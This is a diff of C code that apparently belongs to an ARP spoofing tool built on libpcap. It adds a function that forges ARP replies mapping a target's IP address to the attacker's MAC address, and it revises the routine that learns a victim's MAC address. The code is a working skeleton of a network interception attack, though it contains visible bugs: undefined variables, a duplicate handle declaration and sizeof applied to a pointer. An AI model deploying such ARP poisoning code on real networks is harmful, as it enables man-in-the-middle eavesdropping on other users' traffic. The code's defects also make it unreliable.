@@ -72,7 +72,7 @@ void print_arp(struct rq_packet* rq_p) {
 		print_ip(rq_p->arp_p.dest_ip_addr);
 }
 
-void send_recv_arp(struct rq_packet* rq_p, struct spoof_list *sp_list, uint8_t *my_ip, uint8_t *my_ether) {
+void send_recv_arp(pcap_t *handle, struct rq_packet* rq_p, struct spoof_list *sp_list, uint8_t *my_ip, uint8_t *my_ether, int i) {
 
 	memcpy(rq_p->arp_p.dest_ip_addr, sp_list[i].sender_ip_addr, 4);
 	memcpy(rq_p->arp_p.source_ip_addr, my_ip, 4);
@@ -83,10 +83,10 @@ void send_recv_arp(struct rq_packet* rq_p, struct spoof_list *sp_list, uint8_t *
 	rq_arp(&rq_p); // make the rest of request packet
 	//print request packet
 
-
 	// send packet
 	pcap_t* handle = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
 	if(handle == NULL)  perror("handle null");
+
 	int tmp;
 	struct libnet_ethernet_hdr *tmp_eth;
 	const uint8_t *get_packet;
@@ -104,10 +104,25 @@ void send_recv_arp(struct rq_packet* rq_p, struct spoof_list *sp_list, uint8_t *
 		tmp_arp = (struct ARP_Header *)(get_packet + sizeof(libnet_ethernet_hdr));
 		if(ntohs(tmp_arp->arp_hw) == 0x0001 && ntohs(tmp_arp->arp_op) == 0x2) {
 			if(tmp_arp->source_ip_addr == rq_p.arp_p.dest_ip_addr) {
-				memcpy(sender_ether, tmp_arp->source_ether_addr, 6);
+				memcpy(rq_p->eth_header.ether_dhost, tmp_arp->source_ether_addr, 6);
 				break;
 			}
 		}
 	}
-	
+}
+
+void send_arp_rply(pcap_t *handle, struct rq_packet* rp_p, uint8_t *sender_ether, struct spoof_list *sp_list, uint8_t *my_ether, int i) {
+
+	memcpy(rp_p->eth_header.ether_shost, my_ether, 6);
+	memcpy(rp_p->eth_header.ether_dhost, sender_ether, 6);
+
+	memcpy(rp_p->arp_p.dest_ip_addr, sp_list[i].sender_ip_addr, 4);
+	memcpy(rp_p->arp_p.source_ip_addr, sp_list[i].target_ip_addr, 4);
+
+	memcpy(rp_p->arp_p.source_ether_addr, my_ether, 6);
+	memcpy(rp_p->arp_p.dest_ether_addr, sender_ether, 6);
+	rp_p->arp_p.arp_op = htons(2); //reply
+
+	pcap_sendpacket(handle, (uint8_t *)&rp_p, sizeof(rp_p));
+
 }
